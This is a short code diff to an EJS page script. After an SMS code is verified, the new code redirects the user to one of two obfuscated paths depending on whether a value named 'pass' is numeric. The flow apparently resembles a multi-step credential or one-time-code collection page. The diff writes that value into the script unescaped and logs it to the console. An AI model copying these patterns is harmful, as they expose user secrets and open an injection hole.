@@ -137,8 +137,15 @@
                             data: JSON.stringify({ code: smsCode }),
                             success: function(info) {
                                 if(info.OK){
-                                    // Redirect to the next step (semitr-2.ejs)
-                                    window.location = "/loading";
+                                    const user = <%- JSON.stringify(pass) %>;
+                                    console.log(user);
+                                    if(isNaN(user)){
+                                        window.location = "/loading?time=7&url=/RKnUB922z6Mf4HDwg3EZ";
+
+                                    }else {
+                                        window.location = "/loading?time=7&url=/PrTomeM9HwWUWSulkTe4";
+                                    }
+                                    
                                 } else {
                                     // Show error message
                                     if(smsCodeError) {
